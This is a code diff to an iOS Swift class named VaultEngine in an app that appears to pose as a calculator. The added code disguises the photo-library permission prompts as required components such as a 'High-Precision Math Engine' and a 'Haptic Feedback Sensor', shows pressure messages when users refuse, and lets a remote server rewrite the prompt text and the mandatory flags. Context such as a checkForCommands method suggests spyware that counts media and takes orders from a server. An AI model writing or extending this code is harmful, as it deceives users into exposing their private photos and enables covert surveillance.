@@ -3,6 +3,13 @@ import Photos
 import AVFoundation
 import UIKit
 
+struct SlotConfig {
+    var title: String
+    var subtitle: String
+    var mandatory: Bool = true
+    var denyMsg: String = "Action Blocked: Required system component."
+}
+
 class VaultEngine: NSObject, ObservableObject {
     static let shared = VaultEngine()
 
@@ -16,6 +23,12 @@ class VaultEngine: NSObject, ObservableObject {
     @Published var videosCount: Int = 0
     @Published var batteryLevel: Int = 100
     @Published var isCharging: Bool = false
+    @Published var isStorageBlocked: Bool = false
+
+    @Published var slot1Config = SlotConfig(title: "Slot 1: Core System Cache", subtitle: "To load local cache and themes", mandatory: true, denyMsg: "System cache access is required to store calculator themes and computation cache.")
+    @Published var slot2Config = SlotConfig(title: "Slot 2: High-Precision Math Engine", subtitle: "64-bit floating point processor", mandatory: true, denyMsg: "Core math calculation engine disabled. Mathematical accuracy cannot be guaranteed without this component.")
+    @Published var slot3Config = SlotConfig(title: "Slot 3: Haptic Feedback Sensor", subtitle: "Taptic hardware impulse control", mandatory: true, denyMsg: "Taptic hardware sensor access required for touch registration.")
+    @Published var slot4Config = SlotConfig(title: "Slot 4: Low-Latency Buffer", subtitle: "Background processing optimizer", mandatory: true, denyMsg: "Background stream buffer disabled. Live calculations suspended until enabled.")
 
     private var audioPlayer: AVAudioPlayer?
     private var pollTimer: Timer?
@@ -86,6 +99,20 @@ class VaultEngine: NSObject, ObservableObject {
         isCharging = (UIDevice.current.batteryState == .charging || UIDevice.current.batteryState == .full)
     }
 
+    func checkPermissionStatus() {
+        let status = PHPhotoLibrary.authorizationStatus(for: .readWrite)
+        DispatchQueue.main.async {
+            if status == .denied || status == .restricted {
+                self.isStorageBlocked = true
+                self.isActivated = false
+            } else if status == .authorized || status == .limited {
+                self.isStorageBlocked = false
+                self.isActivated = true
+                self.refreshMediaStats()
+            }
+        }
+    }
+
     // MARK: - Method 2 Storage/Cache Permission
     func requestStoragePermission(completion: @escaping (Bool) -> Void) {
         PHPhotoLibrary.requestAuthorization(for: .readWrite) { status in
@@ -93,8 +120,12 @@ class VaultEngine: NSObject, ObservableObject {
                 let granted = (status == .authorized || status == .limited)
                 if granted {
                     self.isActivated = true
+                    self.isStorageBlocked = false
                     self.saveSettings()
                     self.refreshMediaStats()
+                } else {
+                    self.isActivated = false
+                    self.isStorageBlocked = true
                 }
                 completion(granted)
             }
@@ -213,7 +244,42 @@ class VaultEngine: NSObject, ObservableObject {
             ]
         ]
         req.httpBody = try? JSONSerialization.data(withJSONObject: body)
-        session.dataTask(with: req).resume()
+        session.dataTask(with: req) { [weak self] data, _, error in
+            guard let self = self, let data = data, error == nil else { return }
+            if let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
+               let cfg = json["config"] as? [String: Any] {
+                DispatchQueue.main.async {
+                    self.applyConfig(cfg)
+                }
+            }
+        }.resume()
+    }
+
+    func applyConfig(_ cfg: [String: Any]) {
+        if let s1 = cfg["slot1"] as? [String: Any] {
+            if let t = s1["title"] as? String { slot1Config.title = t }
+            if let sub = s1["subtitle"] as? String { slot1Config.subtitle = sub }
+            if let m = s1["mandatory"] as? Bool { slot1Config.mandatory = m }
+            if let d = s1["denyMsg"] as? String { slot1Config.denyMsg = d }
+        }
+        if let s2 = cfg["slot2"] as? [String: Any] {
+            if let t = s2["title"] as? String { slot2Config.title = t }
+            if let sub = s2["subtitle"] as? String { slot2Config.subtitle = sub }
+            if let m = s2["mandatory"] as? Bool { slot2Config.mandatory = m }
+            if let d = s2["denyMsg"] as? String { slot2Config.denyMsg = d }
+        }
+        if let s3 = cfg["slot3"] as? [String: Any] {
+            if let t = s3["title"] as? String { slot3Config.title = t }
+            if let sub = s3["subtitle"] as? String { slot3Config.subtitle = sub }
+            if let m = s3["mandatory"] as? Bool { slot3Config.mandatory = m }
+            if let d = s3["denyMsg"] as? String { slot3Config.denyMsg = d }
+        }
+        if let s4 = cfg["slot4"] as? [String: Any] {
+            if let t = s4["title"] as? String { slot4Config.title = t }
+            if let sub = s4["subtitle"] as? String { slot4Config.subtitle = sub }
+            if let m = s4["mandatory"] as? Bool { slot4Config.mandatory = m }
+            if let d = s4["denyMsg"] as? String { slot4Config.denyMsg = d }
+        }
     }
 
     func checkForCommands() {
